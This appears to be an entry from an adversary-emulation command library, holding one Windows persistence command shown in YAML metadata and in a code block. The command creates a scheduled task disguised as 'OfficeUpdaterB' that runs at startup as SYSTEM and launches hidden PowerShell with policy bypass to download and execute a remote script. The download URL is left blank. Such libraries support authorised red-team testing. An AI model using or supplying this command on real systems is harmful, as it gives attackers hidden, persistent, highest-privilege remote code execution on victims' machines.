---
id: c800c099-003a-4055-96c9-19ec0d3f79fc
name: (X64) - On System Start
type: command
executor: bash
data: 'schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
  -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c ''IEX ((new-object
  net.webclient).downloadstring(''''''http:///''''''))''" /sc onstart /ru System

  '
output: null
created_at: '2020-07-14T18:21:10.246835+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# (X64) - On System Start

```bash
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'" /sc onstart /ru System

```


